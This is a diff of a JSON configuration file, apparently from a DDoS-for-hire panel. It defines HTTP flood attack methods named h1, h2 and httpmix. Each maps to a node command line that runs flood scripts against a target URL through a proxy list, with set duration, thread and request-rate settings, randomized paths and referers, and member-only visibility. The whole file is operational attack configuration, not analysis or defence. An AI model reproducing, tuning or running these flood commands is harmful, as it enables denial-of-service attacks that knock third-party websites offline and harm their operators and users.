@@ -1,20 +1,20 @@
 {
-    "http2": {
-        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 5 -r 128 -p live.txt -v 2 --full true --delay 1 -d false ",
-        "url": "url",
-        "time": 120,
-        "visibility": "MEMBER"
-    },
-    "http1": {
-        "command": "node --max-old-space-size=65536 http1 POST url live.txt 120 128 5 randomstring=true",
-        "url": "url",
-        "time": 120,
-        "visibility": "MEMBER"
-    },
     "httpmix": {
-        "command": "node --max-old-space-size=65536 superkill -m POST -u url -s 120 -t 4 -r 128 -p live.txt -v 2 --full true --delay 1 -d false & node --max-old-space-size=65536 http1 POST url live.txt 120 128 4 randomstring=true",
+        "command": "node --max-old-space-size=65536 h1 POST url live.txt 60 999 8 randomstring=true & node --max-old-space-size=65536 h2 -m POST -u url -s 60 -p live.txt --full true --delay 1 -d false & node --max-old-space-size=65536 httpmix POST url 60 4 128 live.txt --http mix --query 1 --delay 1 --referer rand --close --randpath --parsed --reset",
+        "url": "url", 
+        "time": 60,
+        "visibility": "MEMBER" 
+    },
+    "h1": {
+        "command": "node --max-old-space-size=65536 h1 POST url live.txt 60 999 8 randomstring=true",
         "url": "url",
-        "time": 120,
+        "time": 60,
+        "visibility": "MEMBER"
+    },
+    "h2": {
+        "command": "node --max-old-space-size=65536 h2 -m POST -u url -s 60 -p live.txt --full true --delay 1 -d false",
+        "url": "url",
+        "time": 60,
         "visibility": "MEMBER"
     }
 }
